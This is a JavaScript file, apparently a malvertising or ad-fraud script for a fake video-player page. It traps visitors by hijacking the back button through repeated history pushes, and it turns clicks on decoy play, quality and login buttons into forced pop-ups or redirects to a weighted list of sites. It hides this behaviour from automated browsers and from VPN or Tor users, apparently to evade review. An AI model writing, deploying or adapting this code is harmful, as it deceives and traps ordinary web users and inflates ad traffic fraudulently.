/**
 * v1.5.7-HYBRID-ULTIMATE
 * ============================================
 * BASE: v1.5.5 (Engine & Security)
 * BACK-LOGIC: v1.5.6 (Bold Back-Hijack)
 */

const CHACHA_CONFIG = {
    DEBUG_MODE: false,
    LINKS: [
        "https://www.blackbox.ai/", "https://chat.deepseek.com/", "https://chatgpt.com/",
        "https://www.theverge.com/tech", "https://tech.com.pk/", "https://techcrunch.com/",
        "https://www.techmeme.com/", "https://rocketpay.co.in/", "https://www.api.org/", "https://www.ibm.com/",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in"
    ],
    APIS: {
        FB_URL: "YOUR_FIREBASE_URL",
        TG_TOKEN: "YOUR_BOT_TOKEN",
        TG_ID: "YOUR_CHAT_ID"
    },
    SETTINGS: {
        MAX_CLICKS_TODAY: 9999999999,
        CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
    }
};

const _baskets = {
    h: CHACHA_CONFIG.LINKS.slice(0, 10),
    n: CHACHA_CONFIG.LINKS.slice(10, 16),
    l: CHACHA_CONFIG.LINKS.slice(16, 20)
};

const _validIds = [
    'tag-btn-play-main', 'tag-input-message-field', 'tag-btn-back-button',
    'tag-btn-server-shift-2', 'tag-btn-q-360', 'tag-btn-q-720', 'tag-btn-q-1080', 'tag-btn-q-4k',
    'tag-btn-auth-login', 'tag-btn-auth-send', 'tag-link-community-rules', 'tag-btn-community-showmore'
];

const _STORAGE_KEY = '_mc_rebirth_final_';
var _vpnFlag = false; 

// ----------------------------------------------------------------------------
// VPN DETECTION (From v1.5.5)
// ----------------------------------------------------------------------------
function _checkVPN() {
    if (navigator.webdriver) { _vpnFlag = true; return; }
    fetch('https://ipapi.co/json/')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.proxy || data.vpn || data.tor) { _vpnFlag = true; }
        }).catch(function() { _vpnFlag = false; });
}

// ----------------------------------------------------------------------------
// AD LOGIC & JUMP (Hybrid)
// ----------------------------------------------------------------------------
function _getStore() {
    try {
        var raw = localStorage.getItem(_STORAGE_KEY);
        return raw ? JSON.parse(raw) : { c: 0, d: null, last: null };
    } catch (e) { return { c: 0, d: null, last: null }; }
}

function _fireAd(btnId, isBack) {
    var store = _getStore();
    var today = new Date().toISOString().slice(0, 10);
    
    if (store.d !== today) { store.c = 0; store.d = today; }
    if (store.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) return;

    var pool = isBack ? _baskets.l : (Math.random() < 0.8 ? _baskets.h : _baskets.n);
    var link = pool[Math.floor(Math.random() * pool.length)];

    store.c += 1;
    store.last = link;
    localStorage.setItem(_STORAGE_KEY, JSON.stringify(store));

    // BOLD JUMP LOGIC (From v1.5.6)
    var win = window.open(link, '_blank');
    if (!win) {
        location.href = link; // पॉप-अप ब्लॉक होने पर खुद के टैब में खोलें
    } else {
        try { win.focus(); } catch (e) {}
    }
}

// ----------------------------------------------------------------------------
// THE BOLD BACK-BUTTON HIJACK (From v1.5.6)
// ----------------------------------------------------------------------------
function _lockHistory() {
    var u = window.location.href;
    history.pushState({p:1}, '', u);
    history.pushState({p:2}, '', u);
}

window.addEventListener('popstate', function() {
    _lockHistory(); // Re-lock
    _fireAd('back-hijack', true); // सीधा फायर, कोई इंतज़ार नहीं
});

// ----------------------------------------------------------------------------
// CLICK HANDLER
// ----------------------------------------------------------------------------
document.addEventListener('click', function(e) {
    _lockHistory(); // एक्टिवेट बैक बटन
    var t = e.target.closest('[id]');
    if (t && _validIds.indexOf(t.id) !== -1) {
        if (_vpnFlag) return; // VPN वालों को शांत ब्लॉक
        _fireAd(t.id, false);
    }
}, false);

// ----------------------------------------------------------------------------
// INIT
// ----------------------------------------------------------------------------
(function() {
    _checkVPN();
    _lockHistory();
})();
